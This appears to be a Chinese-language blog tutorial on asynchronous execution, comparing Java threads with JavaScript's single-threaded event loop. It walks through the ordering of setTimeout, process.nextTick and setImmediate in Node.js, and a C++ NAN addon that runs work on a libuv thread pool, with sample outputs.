    <content><![CDATA[<h2 id="1-异步是啥"><a href="#1-异步是啥" class="headerlink" title="1.异步是啥"></a>1.异步是啥</h2><p>与异步对应的就是同步，对于同步我们很好理解，就是代码顺序执行。但是一到异步代码，很多人多少有些理不清。异步，从功能上讲，就是在背后偷偷的执行，不堵塞当前运行的代码；从实现上讲，能够这么做的，就只能靠在当前运行代码中另一起线程或者进程了。举一个使用线程来实现异步的例子：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyAsync</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">boolean</span> done <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

	<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>done<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//子线程中的循环</span>
			<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"thread out x"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
				<span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//				Thread.currentThread().interrupt();</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">setDone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		done <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token class-name">MyAsync</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyAsync</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//起子线程</span>
		<span class="token keyword">long</span> last <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//主线程中循环</span>
			<span class="token keyword">long</span> now <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>now <span class="token operator">-</span> last <span class="token operator">></span> <span class="token number">1000</span> <span class="token operator">*</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				last <span class="token operator">=</span> now<span class="token punctuation">;</span>
				count <span class="token operator">++</span><span class="token punctuation">;</span>
				<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"the "</span> <span class="token operator">+</span> count <span class="token operator">+</span> <span class="token string">"th count."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			
		<span class="token punctuation">&#125;</span>

		t<span class="token punctuation">.</span><span class="token function">setDone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>代码1.1 线程示例</strong><br>对于代码1.1的运行结果，有可能是这个样子的：  </p>
<pre><code>thread out x
thread out x
thread out x
the 1th count.
thread out x
thread out x
the 2th count.
thread out x
thread out x
the 3th count.
</code></pre>
<p>代码27-38行起是主线程循环，7-15行是子线程循环，你多运行几次，就可以看出两个循环的输出是很随机的，但是不管运行多少次两个循环的输出都是交叉在一起的。这样我们就可以推断出，运行主线程的代码的时候，子线程的代码也在背后偷偷的运行，说白了两者是并行运行的。</p>
<h2 id="2-js中的异步"><a href="#2-js中的异步" class="headerlink" title="2.js中的异步"></a>2.js中的异步</h2><p>就是因为异步这个特性，js如今被大家推崇，下面用一个小例子来演示一下js中异步的使用：  </p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">synchronizedCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">var</span> last <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">var</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">var</span> now <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>now <span class="token operator">-</span> last <span class="token operator">></span> <span class="token number">1000</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			last <span class="token operator">=</span> now<span class="token punctuation">;</span>
			count<span class="token operator">++</span><span class="token punctuation">;</span>
			console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'the %dth count.'</span><span class="token punctuation">,</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'exist while.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setTimeout 0 occured first.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setTimeout 0 occured second.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">synchronizedCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>代码2.1 setTimeout的例子</strong><br>我们运行代码2.1，然后不管运行多少次，输出都是这个样子的：</p>
<pre><code>the 1th count.
the 2th count.
the 3th count.
the 4th count.
the 5th count.
exist while.
setTimeout 0 occured first.
setTimeout 0 occured second.
</code></pre>
<p><strong>输出2.1</strong><br>跟java中的异步和同步代码会交叉输出相比，js中的异步其实是排好队输出的。由于js是单线程执行代码的，所以没有那种交叉输出的效果。那么还有一个问题，while循环明明运行了5秒钟，为何在这期间那两个setTimeout一直没有运行呢？这就和js代码的异步机制有关了。js代码中有帧的概念，对于同步代码是在当前帧运行的，异步代码是在下一帧运行的。对于代码2.1我们给代码运行画一幅图的话，应该是这样的：<br><img src="https://blog.whyun.com/images/js_frame.png" alt="js帧结构"><br><strong>图2.1 js帧结构</strong><br>那么为什么是第一个setTimeout先触发，第二个后触发呢，难道仅仅由于先后顺序？我们把第一个setTimeout改为<code>setTimeout(function() &#123;console.log(&#39;setTimeout 0 occured first.&#39;);&#125;,100);</code>,那么输出的时候就会是先输出<code>setTimeout 0 occured second.</code>,在输出<code>setTimeout 0 occured first.</code>。也就是说在第二帧setTimeout的回调的执行顺序不仅与代码顺序有关还和延迟时间有关。<br>在node.js中还有一个特殊的API，就是<code>process.nextTick</code>,虽然已经不推荐使用了，但是已经可以在很多代码中看到它的身影。例如如下代码：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setTimeout 0 occured first.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setTimeout 0 occured second.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	process<span class="token punctuation">.</span><span class="token function">nextTick</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'nextTick occured.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">synchronizedCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>代码2.2</strong><br>运行后输出：</p>
<pre><code>the 1th count.
the 2th count.
the 3th count.
the 4th count.
the 5th count.
exist while.
nextTick occured.
setTimeout 0 occured first.
setTimeout 0 occured second.  
</code></pre>
<p><strong>输出2.2</strong><br>之所以nextTick排在所有异步的最前面，是由于nextTick是在第一帧运行的，而其他的都是在第二帧运行的。也就是说代码运行情况是这个样子的：<br><img src="http://blog.whyun.com/images/js_frame2.png"><br><strong>图2.2 js帧结构</strong><br>接下来再举几个异步API的例子，这次我们添加<code>setImmediate</code>和<code>mkdir</code>两个函数：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> synchronizedCode <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./sync'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setTimeout 0 occured first.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setTimeout 0 occured second.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	process<span class="token punctuation">.</span><span class="token function">nextTick</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'nextTick occured.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setImmediate</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setImmediate occured.'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">var</span> rand <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">pseudoRandomBytes</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	fs<span class="token punctuation">.</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string">'d:\\temp\\xx'</span><span class="token operator">+</span><span class="token string">'\\'</span><span class="token operator">+</span>rand<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span><span class="token string">'错误'</span><span class="token punctuation">,</span>err<span class="token punctuation">.</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'create directory success.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>		
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">synchronizedCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码2.3</strong><br>那么他的输出就应该是这样的：  </p>
<pre><code>the 1th count.
the 2th count.
the 3th count.
the 4th count.
the 5th count.
exist while.
nextTick occured.
setTimeout 0 occured first.
setTimeout 0 occured second.
setImmediate occured.
create directory success.  
</code></pre>
<p><strong>输出2.3</strong></p>
<p>等等，问题来了，这里最后一句才打印<code>create directory success</code>,那么是不是程序是在最后一步才创建的文件夹呢，如果真是这样，就有点低效了，起码这个创建文件的工作被那个while循环给延迟了得有5秒钟。不过幸好，这个想法是错误的！node.js中使用libuv来IO或者CPU计算量大的操作，而在libuv中处理这些耗时的操作都是用线程来解决，以避免堵塞住js线程（这一点和android的程序设计思路类似，android开发中使用子线程来处理耗时逻辑，避免对主线程造成卡顿）。这里我们来演示一个libuv的异步处理，在异步处理中模拟一个耗时操作：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;node.h&gt;
#include &lt;string&gt;
#include &lt;v8.h&gt;
#include &lt;nan.h&gt;

#ifdef WINDOWS_SPECIFIC_DEFINE
#include &lt;windows.h&gt;
typedef DWORD ThreadId;
#else
#include &lt;unistd.h&gt;
#include &lt;pthread.h&gt;
typedef unsigned int ThreadId;
#endif
using namespace v8;

NAN_METHOD(async_hello);

static ThreadId __getThreadId() &#123;
	ThreadId nThreadID;
#ifdef WINDOWS_SPECIFIC_DEFINE
	
	nThreadID &#x3D; GetCurrentProcessId();
	nThreadID &#x3D; (nThreadID &lt;&lt; 16) + GetCurrentThreadId();
#else
	nThreadID &#x3D; getpid();
	nThreadID &#x3D; (nThreadID &lt;&lt; 16) + pthread_self();
#endif
	return nThreadID;
&#125;

static void __tsleep(unsigned int millisecond) &#123;
#ifdef WINDOWS_SPECIFIC_DEFINE
	::Sleep(millisecond);
#else
	usleep(millisecond*1000);
#endif
&#125;

class ThreadWoker : public NanAsyncWorker &#123;
	private:
		std::string str;
	public:
		ThreadWoker(NanCallback *callback,std::string str)
			: NanAsyncWorker(callback), str(str) &#123;&#125;
		~ThreadWoker() &#123;&#125;
		&#x2F;&#x2F;在该函数内模拟处理过程 ，如i&#x2F;o阻塞或者cpu高消耗情形的处理。
		&#x2F;&#x2F; 注意不能使用v8 api,这个线程不是在js主线程内
		void Execute() &#123;
			printf(&quot;\n%s Thread id : gettid() &#x3D;&#x3D; %d\n&quot;,__FUNCTION__,__getThreadId());
			for (int i&#x3D;0;i&lt;15;i++) &#123;
				__tsleep(1000);
				printf(&quot;sleep 1 seconds in uv_work\n&quot;);
			&#125;
		&#125;
		void HandleOKCallback () &#123;
			NanScope();

			Local&lt;Value&gt; argv[] &#x3D; &#123;
				NanNull(),
				NanNew(&quot;the result:&quot;+str)
			&#125;;

			callback-&gt;Call(2, argv);
		&#125;;
&#125;;
NAN_METHOD(async_hello) &#123;
    printf(&quot;\n%s Thread id : gettid() &#x3D;&#x3D; %d\n&quot;,__FUNCTION__,__getThreadId());
    NanScope();
    if(args.Length() &lt; 2) &#123; 
    NanThrowError(&quot;Wrong number of arguments&quot;); 
    NanReturnUndefined(); 
&#125;


if (!args[0]-&gt;IsString() || !args[1]-&gt;IsFunction()) &#123;
    NanThrowError(&quot;Wrong number of arguments&quot;);
    NanReturnUndefined();
&#125;

&#x2F;&#x2F; 强制转换成函数变量
NanCallback *callback &#x3D; new NanCallback(args[1].As&lt;Function&gt;());
    NanUtf8String param1(args[0]);
    std::string str &#x3D; std::string(*param1); 
    NanAsyncQueueWorker(new ThreadWoker(callback, str));
    NanReturnUndefined(); 
&#125;

void Init(Handle&lt;Object&gt; exports) &#123;
    exports-&gt;Set(NanNew&lt;String&gt;(&quot;async_hello&quot;),
    NanNew&lt;FunctionTemplate&gt;(async_hello)-&gt;GetFunction());
&#125;

NODE_MODULE(binding, Init);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码2.4</strong>  </p>
<blockquote>
<p>上述代码的编译参照<a href="http://git.oschina.net/yunnysunny/async-tutorial-code/blob/master/addon/readme.md">编译说明</a>，项目源码地址参加第3节。关于nan的使用，可以参照我的另一篇教程<a href="http://blog.whyun.com/posts/nan/">《nan基础教程》</a>。</p>
</blockquote>
<p>编写的测试代码，将其运行，就可以看出函数<code>Execute</code>根本就不在js线程中执行，也就是说它是可以和js线程并行的；函数<code>HandleOKCallback</code>中能够触发js中的回调函数，将处理完的结果交给js。下面就编译上面代码（需要node-gyp支持，执行<code>node-gpy rebuild</code>进行编译），来验证上述结论：  </p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">synchronizedCode</span><span class="token punctuation">(</span><span class="token string">'timer1'</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setTimeout 0 occured second.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	process<span class="token punctuation">.</span><span class="token function">nextTick</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'nextTick occured.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">var</span> addon <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./addon/build/Release/binding'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	addon<span class="token punctuation">.</span><span class="token function">async_hello</span><span class="token punctuation">(</span><span class="token string">"good"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'node addon result'</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">setImmediate</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setImmediate occured.'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">var</span> rand <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">pseudoRandomBytes</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	fs<span class="token punctuation">.</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string">'d:\\temp\\xx'</span><span class="token operator">+</span><span class="token string">'\\'</span><span class="token operator">+</span>rand<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span><span class="token string">'错误'</span><span class="token punctuation">,</span>err<span class="token punctuation">.</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'create directory success.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>		
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">synchronizedCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>代码2.5</strong><br>我们在代码2.5中引入了代码2.4中的c++扩展，其输出内容如下</p>
<pre><code>async_hello Thread id : gettid() == 284953360

call_work Thread id : gettid() == 284958096
sleep 1 seconds in uv_work
sleep 1 seconds in uv_work
the 1th count.
sleep 1 seconds in uv_work
sleep 1 seconds in uv_work
the 2th count.
sleep 1 seconds in uv_work
sleep 1 seconds in uv_work
the 3th count.
sleep 1 seconds in uv_work
sleep 1 seconds in uv_work
the 4th count.
sleep 1 seconds in uv_work
sleep 1 seconds in uv_work
the 5th count.
exist while.
nextTick occured.
sleep 1 seconds in uv_work
sleep 1 seconds in uv_work
the 1th count in [timer1].
sleep 1 seconds in uv_work
sleep 1 seconds in uv_work
the 2th count in [timer1].
sleep 1 seconds in uv_work
the 3th count in [timer1].
the 4th count in [timer1].
exist while in [timer1].
setTimeout 0 occured second.
setImmediate occured.
create directory success.

call_work_after Thread id : gettid() == 284953360
node addon result good---&gt;hello world from c++
</code></pre>
